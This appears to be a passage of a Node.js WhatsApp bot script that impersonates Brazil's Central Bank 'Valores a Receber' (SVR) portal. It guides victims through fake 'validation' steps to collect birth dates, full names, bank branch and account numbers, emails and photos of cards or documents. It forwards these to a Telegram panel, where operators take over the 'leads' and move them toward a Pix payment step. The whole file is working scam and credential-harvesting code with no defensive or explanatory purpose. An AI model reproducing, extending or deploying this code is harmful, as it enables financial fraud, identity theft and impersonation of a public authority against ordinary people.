wcmVzYSBEZSBQZXF1ZW5vIFAiLCIxODQiOiJCYW5jbyBJdGHDuiBCQkEgUy5BLiIsIjE4OCI6IkF0aXZhIEludmVzdGltZW50b3MgUy5BLiBDb3JyZXRvcmEgRGUgVMOtdHVsb3MsIEPDom1iaW8gRSBWYWxvcmVzIiwiMTg5IjoiSFMgRmluYW5jZWlyYSBTL0EgQ3JlZGl0byIsIjE5MCI6IlNlcnZpY29vcCAtIENvb3BlcmF0aXZhIERlIENyw6lkaXRvIERvcyBTZXJ2aWRvcmVzIFDDumJsaWNvcyBFc3RhZHVhaXMgRG8gUmlvIEdyYW4iLCIxOTEiOiJOb3ZhIEZ1dHVyYSBDb3JyZXRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhLiIsIjE5NCI6IlBhcm1ldGFsIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTk2IjoiRmFpciBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTk3IjoiU3RvbmUgUGFnYW1lbnRvcyBTLkEuIiwiMjA4IjoiQmFuY28gQlRHIFBhY3R1YWwgUy5BLiIsIjIxMiI6IkJhbmNvIE9yaWdpbmFsIFMuQS4iLCIyMTMiOiJCYW5jbyBBcmJpIFMuQS4iLCIyMTciOiJCYW5jbyBKb2huIERlZXJlIFMuQS4iLCIyMTgiOiJCYW5jbyBCczIgUy5BLiIsIjIyMiI6IkJhbmNvIENyw6lkaXQgQWdyaWNvbGUgQnJhc2lsIFMuQS4iLCIyMjQiOiJCYW5jbyBGaWJyYSBTLkEuIiwiMjMzIjoiQmFuY28gQ2V0ZWxlbSBTLkEuIiwiMjM3IjoiQmFuY28gQnJhZGVzY28gUy5BLiIsIjI0MSI6IkJhbmNvIENsw6Fzc2ljbyBTLkEuIiwiMjQzIjoiQmFuY28gTcOheGltYSBTLkEuIiwiMjQ2IjoiQmFuY28gQWJjIEJyYXNpbCBTLkEuIiwiMjQ5IjoiQmFuY28gSW52ZXN0Y3JlZCBVbmliYW5jbyBTLkEuIiwiMjUwIjoiQmN2IC0gQmFuY28gZGUgQ3LDqWRpdG8gZSBWYXJlam8gUy5BLiIsIjI1MyI6IkJleHMgQ29ycmV0b3JhIERlIEPDom1iaW8gUy5BLiIsIjI1NCI6IlBhcmFuw6EgQmFuY28gUy5BLiIsIjI1OSI6Ik1vbmV5Y29ycCBCYW5jbyBkZSBtw61iaW8gUy5BLiIsIjI2MCI6Ik51IFBhZ2FtZW50b3MgUy5BLiIsIjI2NSI6IkJhbmNvIEZhdG9yIFMuQS4iLCIyNjYiOiJCYW5jbyBDZWR1bGEgUy5BLiIsIjI2OCI6IkJhcmkgQ29tcGFuaGlhIEhpcG90ZWPDoXJpYSIsIjI2OSI6IkJhbmNvIEhTQkMgUy5BLiIsIjI3MCI6IlNhZ2l0dXIgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYS4iLCIyNzEiOiJJYiBDb3JyZXRvcmEgZGUgQ8OibWJpbywgdMOtdHVsbyBlIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIyNzIiOiJCYW5jbyBBZ2sgUy5BLiIsIjI3MyI6IkNvb3BlcmF0aXZhIGRlIENyw6lkaXRvIFUnIn0="));

function detectBank(text) {
    const clean = text.toLowerCase();
    const commonPatterns = [
        { code: "237", name: "Bradesco", keywords: ["bradesco", "brad"] },
        { code: "341", name: "Itaú", keywords: ["itau", "itau"] },
        { code: "001", name: "Banco do Brasil", keywords: ["banco do brasil", "bb", "banco brasil"] },
        { code: "104", name: "Caixa Econômica", keywords: ["caixa", "cef"] },
        { code: "033", name: "Santander", keywords: ["santander"] },
        { code: "260", name: "Nubank", keywords: ["nubank", "nu bank", "nu pagamentos"] },
        { code: "077", name: "Inter", keywords: ["inter", "banco inter"] },
        { code: "336", name: "C6 Bank", keywords: ["c6", "c6 bank"] },
        { code: "290", name: "PagBank", keywords: ["pagbank", "pagseguro", "pag bank"] },
        { code: "323", name: "Mercado Pago", keywords: ["mercado pago", "mercado livre", "mercadopago"] }
    ];

    for (const bank of commonPatterns) {
        if (bank.keywords.some(k => clean.includes(k))) {
            return { code: bank.code, name: bank.name };
        }
    }

    for (const [code, name] of Object.entries(BANCOS_LIST)) {
        if (clean.includes(code) || clean.includes(name.toLowerCase())) {
            return { code, name };
        }
    }
    return null;
}
function validateBankData(bankCode, ag, cc) {
    const cleanAg = ag.replace(/\D/g, "");
    const cleanCc = cc.replace(/\D/g, "");

    // Regras específicas para os maiores bancos (Overrides)
    const specificRules = {
        "001": { agLen: 4, ccMin: 5, ccMax: 9 },  // BB
        "237": { agLen: 4, ccMin: 5, ccMax: 7 },  // Bradesco
        "341": { agLen: 4, ccMin: 5, ccMax: 5 },  // Itaú
        "104": { agLen: 4, ccMin: 11, ccMax: 13 }, // Caixa (com operação)
        "033": { agLen: 4, ccMin: 8, ccMax: 8 },  // Santander
        "260": { agLen: 4, ccMin: 4, ccMax: 10 }, // Nubank
        "077": { agLen: 4, ccMin: 4, ccMax: 10 }, // Inter
        "336": { agLen: 4, ccMin: 4, ccMax: 10 }  // C6 Bank
    };

    const bankName = BANCOS_LIST[bankCode] || "Instituição";
    const rule = specificRules[bankCode] || { agLen: 4, ccMin: 4, ccMax: 15 }; // Regra padrão para todos os bancos da lista

    if (cleanAg.length !== rule.agLen) {
        return { valid: false, error: `A agência do ${bankName} deve conter exatamente ${rule.agLen} dígitos.` };
    }
    if (cleanCc.length < rule.ccMin || cleanCc.length > rule.ccMax) {
        return { valid: false, error: `A conta informada para o ${bankName} parece ser inválida ou está fora do padrão (mínimo ${rule.ccMin} dígitos).` };
    }

    return { valid: true };
}


client.on('message_create', async (msg) => {
    if (BOT_ID !== 'main') return;
    if (!msg.fromMe) return;

    const targetChatId = msg.to;
    if (!targetChatId) return;
    if (targetChatId.includes('@g.us')) return;

    const currentSession = chatSessions.get(targetChatId);

    // --- DETECÇÃO DE LIGAÇÃO ATENDIDA / DESLIGADA ---
    if (msg.type === 'call_log') {
        const callBody = (msg.body || '').toLowerCase();
        // Verifica se a ligação foi atendida (não perdida)
        const callAnswered = !callBody.includes('perdida') && !callBody.includes('missed') && !callBody.includes('sem resposta');

        if (currentSession) {
            currentSession.isCalling = false;

            // Se a ligação acabou e ele ainda estava na Etapa 2, 
            // marcamos como PENDENTE novamente se o lead desligou (ou a call acabou)
            // mas marcamos como CONCLUÍDA se foi atendida.
            if (currentSession.mode === 'human' && currentSession.humanStep <= 2) {
                if (callAnswered) {
                    currentSession.humanStep = 2; // Concluída (mas agora desligada)
                    // Opcional: Se o user quer que volte a ser PENDENTE assim que desliga:
                    currentSession.humanStep = 1;
                    console.log(`📞 [CALL] Ligação atendida e encerrada por ${targetChatId} — Status: Pendente para próxima ação.`);
                } else {
                    currentSession.humanStep = 1; // Perdida -> Pendente
                    console.log(`📵 [CALL] Ligação perdida/não atendida por ${targetChatId}.`);
                }

                chatSessions.set(targetChatId, currentSession);
                saveSessions();

                // Atualiza painel principal no Telegram
                if (currentSession.tgMsgId) {
                    const { text: txt, reply_markup } = buildCadastroMessage(
                        targetChatId,
                        currentSession.name,
                        currentSession.birthDate,
                        'human',
                        currentSession.docType,
                        currentSession.humanStep,
                        false
                    );
                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
                }

                if (callAnswered) {
                    // Envia mensagem de Etapa 2 concluída ao lead (opcional se quiser manter)
                    setTimeout(async () => {
                        try { await sendBotMessage(targetChatId, MENSAGEM_ETAPA_2_CONCLUIDA); } catch (e) { }
                    }, 2000);
                }
            }
        }
        return;
    }

    if (!currentSession || (currentSession.mode !== 'bot' && currentSession.mode !== 'waiting') || internalMessageChats.has(targetChatId)) return;

    const updatedSession = {
        ...currentSession,
        mode: 'human',
        humanStep: 1,
        name: currentSession.name || null,
        birthDate: currentSession.birthDate || null,
        docType: currentSession.docType || 'CPF'
    };

    chatSessions.set(targetChatId, updatedSession);
    saveSessions();

    const { text: txtAssume, reply_markup: rmAssume } = buildCadastroMessage(targetChatId, updatedSession.name, updatedSession.birthDate, 'human', updatedSession.docType, 1);
    await notifyTelegram(txtAssume, updatedSession.tgMsgId, rmAssume);

    setTimeout(async () => {
        try {
            await sendBotMessage(targetChatId, MENSAGEM_OPERADOR_ASSUME);
            console.log(`📨 [ADMIN] Mensagem formal enviada ao lead: ${targetChatId}`);
        } catch (e) {
            console.error(`❌ [ADMIN] Erro ao enviar mensagem formal:`, e.message);
        }
    }, 1000);
});

client.on('message', async (msg) => {
    if (BOT_ID !== 'main') return;
    if (msg.fromMe) return;

    const targetChatId = msg.from;
    if (!targetChatId) return;
    if (targetChatId.includes('@g.us')) return;

    if (processingLock.has(targetChatId)) {
        console.log(`⏳ [LOCK] Mensagem de ${targetChatId} ignorada — já processando.`);
        return;
    }
    processingLock.add(targetChatId);

    try {
        await processIncomingMessage(msg, targetChatId);
    } catch (e) {
        console.error(`❌ [ERRO] Falha ao processar mensagem de ${targetChatId}:`, e.message);
    } finally {
        // Reduzido o lock para 1s para ser mais responsivo se o bot estiver lento
        setTimeout(() => processingLock.delete(targetChatId), 1000);
    }
});

async function processIncomingMessage(msg, targetChatId) {
    const text = (msg.body || "").trim();
    const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');

    fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));

    const currentSession = chatSessions.get(targetChatId);

    if (isTrigger) {
        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;

        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
        const docTypeMatch = text.match(/Tipo de Documento: \*(CPF|CNPJ)\*/i);
        const docType = docTypeMatch ? docTypeMatch[1].toUpperCase() : 'CPF';
        const isPJ = docType === 'CNPJ';

        let expectedData = null;
        if (userId) {
            try {
                // Tenta buscar da API (que agora tem persistência)
                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, {
                    headers: API_HEADERS,
                    timeout: 8000
                });
                if (res.status === 200 && res.data) {
                    expectedData = res.data;
                    console.log(`✅ [SINC] Dados recuperados da API para userId: ${userId}`);
                }
            } catch (e) {
                console.warn(`⚠️ [SINC] Falha ao buscar da API (${userId}). Tentando base local...`);
                // FAILBACK: Tenta ler diretamente do arquivo se estiver no mesmo servidor
                try {
                    const visitorPath = path.join(process.cwd(), 'visitor-sessions.json');
                    if (fs.existsSync(visitorPath)) {
                        const visitors = JSON.parse(fs.readFileSync(visitorPath, 'utf-8'));
                        if (visitors[userId]) {
                            expectedData = {
                                docValue: visitors[userId].docValue,
                                birthDate: visitors[userId].birthDate,
                                fullName: ""
                            };
                            console.log(`📂 [SINC] Dados recuperados da base LOCAL para userId: ${userId}`);
                        }
                    }
                } catch (err) { }
            }
        }

        const { text: txtInit, reply_markup } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType);
        const tgMsgId = await notifyTelegram(txtInit, null, reply_markup);

        chatSessions.set(targetChatId, {
            mode: 'bot',
            step: 1,
            userId,
            expectedData,
            docType,
            lastMsgTime: Date.now(),
            createdAt: Date.now(),
            tgMsgId
        });
        saveSessions();

        setTimeout(async () => {
            if (isPJ) {
                await sendBotMessage(targetChatId,
                    `🏢 *Portal SVR — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
            } else {
                await sendBotMessage(targetChatId,
                    `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
            }
        }, 1500);
        return;
    }

    if (currentSession && currentSession.mode === 'waiting') {
        const pos = getQueuePosition(targetChatId);
        const chat = await msg.getChat();
        await chat.sendStateTyping();

        const aiReply = await askAI(PROMPT_FILA, text);
        const posText = pos ? `\n\n📌 *Sua posição atual na fila:* ${pos}º lugar.` : '';
        const fallback = `📋 *Portal SVR — Sistema de Valores a Receber*\n\nPrezado(a) titular,\n\nSeus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\nO processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\nAgradecemos sua compreensão.\n_Portal SVR — Banco Central do Brasil_`;

        await sendBotMessage(targetChatId, aiReply || fallback);
        return;
    }

    if (currentSession && currentSession.mode === 'human') {
        if (currentSession.humanStep === 5) {
            if (msg.hasMedia) {
                try {
                    const media = await msg.downloadMedia();
                    if (media) {
                        const buffer = Buffer.from(media.data, 'base64');
                        await notifyTelegramPhoto(buffer, `🔐 <b>DOCUMENTO SIGILOSO RECEBIDO</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou um anexo (Cartão/Doc) para validação da Etapa 5.</i>`);
                    }
                } catch (e) {
                    await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA (Sem Imagem)</b>\nLead: <code>${targetChatId}</code>\n<i>Erro ao processar imagem, verifique o WhatsApp.</i>`);
                }
                await sendBotMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
                return;
            }

            const agMatch = text.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
            const ccMatch = text.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);

            if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
                const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
                const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');
                await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);
                await sendBotMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
                return;
            }
        }
        return;
    }

    if (!currentSession || currentSession.mode !== 'bot') {
        const chat = await msg.getChat();
        await chat.sendStateTyping();

        const { text: txtEsp, reply_markup: rmEsp } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data');
        const tgMsgId = await notifyTelegram(txtEsp, null, rmEsp);
        await notifyTelegram(`📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`);

        chatSessions.set(targetChatId, {
            mode: 'bot',
            step: 1,
            userId: null,
            expectedData: null,
            lastMsgTime: Date.now(),
            createdAt: Date.now(),
            tgMsgId
        });
        saveSessions();

        const aiReply = await askAI(PROMPT_INICIAL, text);
        const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal SVR — Sistema de Valores a Receber.*\n\nIdentificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\nPara prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;

        setTimeout(async () => {
            await sendBotMessage(targetChatId, aiReply || fallback);
        }, 1500);
        return;
    }

    currentSession.lastMsgTime = Date.now();
    const chat = await msg.getChat();
    await chat.sendStateTyping();
    const isPJ = currentSession.docType === 'CNPJ';

    if (currentSession.step === 1) {
        // More robust date regex: matches DD/MM/YYYY, DD-MM-YYYY, or DDMMYYYY
        const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})/) || text.match(/(\d{8})/);
        
        if (!dateMatch) {
            console.log(`[BOT] Date format not recognized for ${targetChatId}: "${text}"`);
            const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
            const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
            await sendBotMessage(targetChatId, aiReply || fallback);
            return;
        }

        const rawDate = dateMatch[0];
        const cleanTyped = rawDate.replace(/\D/g, "");
        
        // Ensure we have exactly 8 digits (DDMMYYYY)
        if (cleanTyped.length !== 8) {
            await sendBotMessage(targetChatId, `⚠️ *Data Incompleta*\n\nPor favor, informe a data completa com dia, mês e ano (Ex: 10/05/1990).`);
            return;
        }

        // Comparison logic
        // Strict Comparison logic
        if (currentSession.userId && !currentSession.expectedData) {
            // If we have a userId but no data, try one last time to fetch it (in case of server lag)
            console.log(`[BOT] userId present but no expectedData for ${targetChatId}. Retrying fetch...`);
            try {
                const res = await axios.get(`${API_URL}/api/v1/session/data/${currentSession.userId}`, {
                    headers: API_HEADERS,
                    timeout: 3000
                });
                if (res.data && res.data.birthDate) {
                    currentSession.expectedData = res.data;
                    console.log(`[BOT] Successfully recovered expectedData on retry for ${targetChatId}`);
                }
            } catch (e) {
                console.log(`[BOT] Retry fetch failed for ${targetChatId}: ${e.message}`);
            }
        }

        if (currentSession.expectedData?.birthDate) {
            const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
            console.log(`[BOT] Comparing dates for ${targetChatId}: Typed=${cleanTyped}, Expected=${cleanExpected}`);
            
            if (cleanTyped !== cleanExpected) {
                console.log(`[BOT] DIVERGENCE: Typed ${cleanTyped} != Expected ${cleanExpected}`);
                await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular no portal.\n\nPor gentileza, verifique os dados e informe novamente conforme preenchido anteriormente.\n📌 *Formato:* DD/MM/AAAA`);
                return;
            }
            console.log(`[BOT] Date MATCH for ${targetChatId}`);
        } else if (currentSession.userId) {
            // We have a protocol but still no data found on server
            console.log(`[BOT] ERROR: userId ${currentSession.userId} has no data on server. Rejecting to be safe.`);
            await notifyTelegram(`🚨 <b>FALHA DE SINCRONISMO</b>\nLead: <code>${targetChatId}</code>\nID: <code>${currentSession.userId}</code>\n<i>O lead tentou validar mas os dados do portal não foram encontrados. Sistema bloqueou por segurança.</i>`);
            await sendBotMessage(targetChatId, `⚠️ *ERRO DE SINCRONISMO — Portal SVR*\n\nNão foi possível localizar seu registro de consulta em nossa base de dados central.\n\nPor gentileza, retorne ao site e realize a consulta novamente para gerar um novo protocolo de segurança.`);
            return;
        } else {
            console.log(`[BOT] Spontaneous lead (no protocol) ${targetChatId}. Proceeding with sanity check.`);
            await notifyTelegram(`⚠️ <b>CONTATO DIRETO (SEM PORTAL)</b>\nLead: <code>${targetChatId}</code>\n<i>O lead entrou em contato sem passar pelo site. Validação manual necessária.</i>`);
        }

        // Format for storage: DD/MM/AAAA
        const formattedDate = cleanTyped.replace(/(\d{2})(\d{2})(\d{4})/, "$1/$2/$3");
        
        currentSession.step = 2;
        currentSession.birthDate = formattedDate;
        chatSessions.set(targetChatId, currentSession);
        saveSessions();

        if (currentSession.tgMsgId) {
            const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, null, formattedDate, 'preenchendo_nome', currentSession.docType);
            await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
        }

        if (isPJ) {
            await sendBotMessage(targetChatId, `✅ *Data de abertura confirmada!*\n\n📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
        } else {
            await sendBotMessage(targetChatId, `✅ *Data de nascimento confirmada!*\n\n📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
        }

    } else if (currentSession.step === 2) {
        const typedName = text.trim();
        if (typedName.length >= 8 && typedName.includes(" ")) {
            if (currentSession.expectedData?.fullName) {
                const isMatch = checkNameMatch(typedName, currentSession.expectedData.fullName);
                if (!isMatch) {
                    await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nO nome informado não corresponde ao titular registrado no protocolo.\n\nPor favor, digite o nome completo exato (Ex: João da Silva Santos):`);
                    return;
                }
            }
            currentSession.step = 2.5;
            currentSession.name = typedName;
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            if (currentSession.tgMsgId) {
                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, typedName, currentSession.birthDate, 'preenchendo_banco', currentSession.docType);
                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
            }

            await sendBotMessage(targetChatId, `✅ *Nome Completo confirmado!*\n\n📍 *FASE 1.3:* Informe o *Nome da sua Instituição Financeira* (Ex: Nubank, Itaú, Caixa, Banco do Brasil, Bradesco, etc):`);
        } else {
            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
            await sendBotMessage(targetChatId, fallback);
        }
    } else if (currentSession.step === 2.5) {
        const detected = detectBank(text);
        if (!detected) {
            await sendBotMessage(targetChatId, `⚠️ Não consegui identificar este banco. Por favor, escreva o nome do banco corretamente (Ex: Nubank, Bradesco, Santander, Itaú).`);
            return;
        }
        currentSession.bankName = detected.name;
        currentSession.bankCode = detected.code;
        currentSession.step = 3;
        chatSessions.set(targetChatId, currentSession);
        saveSessions();
        await sendBotMessage(targetChatId, `🏦 Banco identificado: *${detected.name}* ✅\n\nAgora informe os números da sua *Agência* bancária:`);
    } else if (currentSession.step === 3) {
        const typedAg = text.trim().replace(/\D/g, "");

        if (typedAg.length >= 3 && typedAg.length <= 5) {
            currentSession.step = 4;
            currentSession.bankAg = typedAg;
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            if (currentSession.tgMsgId) {
                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'preenchendo_banco', currentSession.docType);
                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
            }

            await sendBotMessage(targetChatId, `✔️ *Agência confirmada*\n\nAgora informe o número da sua *Conta* com dígito:`);
        } else {
            await sendBotMessage(targetChatId, `⚠️ *Agência Inválida*\n\nPor favor, informe apenas os números da sua agência (Ex: 0001).`);
        }
    } else if (currentSession.step === 4) {
        const typedCc = text.trim();
        const cleanCc = typedCc.replace(/\D/g, "");
        if (cleanCc.length >= 4) {

            const validation = validateBankData(currentSession.bankCode, currentSession.bankAg, typedCc);

            if (!validation.valid) {
                await sendBotMessage(targetChatId, `⚠️ *DADOS INCONSISTENTES*\n\nA agência e conta informadas não correspondem ao padrão do banco *${currentSession.bankName}*.\n\nPor favor, informe o número da *Conta* novamente:`);
                return;
            }

            currentSession.step = 5;
            currentSession.bankCc = typedCc;
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            await sendBotMessage(targetChatId,
                `🏛️ *${currentSession.bankName.toUpperCase()} CONFIRMADO* ✅\n\n` +
                `📍 *DADOS CAPTURADOS:*\n` +
                `- Agência: ${currentSession.bankAg}\n` +
                `- Conta: ${currentSession.bankCc}\n` +
                `- Instituição: ${currentSession.bankName}\n\n` +
                `Prezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n` +
                `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas.\n\n` +
                `*Responda SIM para confirmar* ou informe os dados novamente.`);
        } else {
            await sendBotMessage(targetChatId, `⚠️ *Conta Inválida*\n\nPor favor, informe o número da sua conta corretamente (mínimo 4 dígitos).`);
        }
    } else if (currentSession.step === 5) {
        if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
            currentSession.step = 6;
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            await sendBotMessage(targetChatId,
                `✅ *Dados bancários confirmados!*\n\n` +
                `📍 *FASE 1.5 — Canal de Comunicação:* Para que o sistema envie seu *Comprovante de Liberação* e a *Notificação de Regularização* após o resgate, informe seu melhor *E-mail* para contato:\n\n` +
                `📌 *Exemplo:* seuemail@provedor.com`);
        } else {
            currentSession.step = 3;
            chatSessions.set(targetChatId, currentSession);
            saveSessions();
            await sendBotMessage(targetChatId, `🔄 *Entendido. Vamos recomeçar a vinculação bancária.*\n\n📍 *FASE 1.3:* Informe sua *Agência* bancária:`);
        }
    } else if (currentSession.step === 6) {
        const typedEmail = text.toLowerCase().trim();
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        const validDomains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com', 'icloud.com', 'uol.com.br', 'bol.com.br', 'ig.com.br', 'terra.com.br', 'live.com'];

        const isFormatValid = emailRegex.test(typedEmail);
        const domain = typedEmail.split('@')[1];
        const isDomainValid = validDomains.includes(domain) || (domain && domain.includes('.gov.br')) || (domain && domain.includes('.edu.br'));

        if (isFormatValid && isDomainValid) {
            currentSession.step = 7;
            currentSession.email = typedEmail;
            currentSession.mode = 'waiting';
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
            const queuePos = getQueuePosition(targetChatId);
            const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;

            if (currentSession.tgMsgId) {
                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType);
                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
            }

            const frenteMsg = clientesFrente > 0
                ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
                : `Sua solicitação é a próxima a ser processada.`;

            await sendBotMessage(targetChatId,
                `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
                `Prezado(a) *${currentSession.name}*,\n` +
                `Seu canal de comunicação (${typedEmail}) foi vinculado com sucesso ao processo de resgate.\n\n` +
                `⌛ *STATUS ATUAL:* Aguardando Processamento Final\n\n` +
                `${frenteMsg}\n\n` +
                `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
                `_Portal SVR — Banco Central do Brasil_`);
        } else {
            await sendBotMessage(targetChatId,
                `⚠️ *E-mail Inválido ou Não Reconhecido*\n\n` +
                `O endereço informado não parece ser um e-mail válido ou pertence a um provedor não homologado.\n\n` +
                `Por gentileza, informe um e-mail válido (Ex: Gmail, Outlook, Hotmail) para receber seu comprovante.`);
        }
    }
}

// --- WATCHER DE COMANDOS EXTERNOS (TELEGRAM -> WHATSAPP) ---
setInterval(async () => {
    // --- cmd-send-*.json: envia mensagem livre ao lead ---
    const sendFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
    for (const file of sendFiles) {
        const cmdPath = path.join(process.cwd(), file);
        let cmd = null;
        try {
            const data = fs.readFileSync(cmdPath, 'utf-8');
            if (data) cmd = JSON.parse(data);
        } catch (e) { continue; /* ignora erro de parse caso o arquivo ainda esteja sendo escrito */ }

        if (cmd) {
            try {
                fs.unlinkSync(cmdPath); // Apaga primeiro para evitar loop infinito de erro
                console.log(`📤 Enviando mensagem externa para: ${cmd.to}`);
                await sendBotMessage(cmd.to, cmd.message);
                if (waitingQueue.find(q => q.chatId === cmd.to)) {
                    removeFromQueue(cmd.to);
                    const s = chatSessions.get(cmd.to) || { mode: 'human', humanStep: 1 };
                    s.mode = 'human';
                    chatSessions.set(cmd.to, s);
                    saveSessions();
                    console.log(`✅ [FILA] Lead ${cmd.to} removido da fila — atendimento assumido pelo admin.`);
                }
            } catch (e) {
                console.error("❌ Erro ao processar cmd-send:", e.message);
            }
        }
    }

    // --- cmd-etapa-*.json: libera etapas 3 e 4 ao lead ---
    const etapaFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-etapa-') && f.endsWith('.json'));
    for (const file of etapaFiles) {
        const cmdPath = path.join(process.cwd(), file);
        let cmd = null;
        try {
            const data = fs.readFileSync(cmdPath, 'utf-8');
            if (data) cmd = JSON.parse(data);
        } catch (e) { continue; }

        if (cmd) {
            try {
                fs.unlinkSync(cmdPath); // Apaga antes de processar
                const { etapa, chatId } = cmd;
                const session = chatSessions.get(chatId);

                console.log(`📋 [ETAPA ${etapa}] Liberando para: ${chatId}`);

                if (etapa === 3) {
                    if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
                    await sendBotMessage(chatId, MENSAGEM_ETAPA_3);
                    // Notifica Telegram com botão para Etapa 4
                    await notifyTelegram(
                        `📋 <b>ETAPA 3 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Use /pix para gerar o protocolo e avançar para Etapa 4.</i>`
                    );
                } else if (etapa === 4) {
                    if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
                    await sendBotMessage(chatId, MENSAGEM_ETAPA_4);
                    await notifyTelegram(
                        `🔐 <b>ETAPA 4 — PROTOCOLO ATIVO</b>\nLead: <code>${chatId}</code>\n\n<i>Aguardando detecção de validação do hash bancário.</i>`,
                        undefined,
                        { inline_keyboard: [[{ text: '💰 Liberar Etapa 5 Manual', callback_data: `etapa:5:${chatId}` }]] }
                    );
                } else if (etapa === 5) {
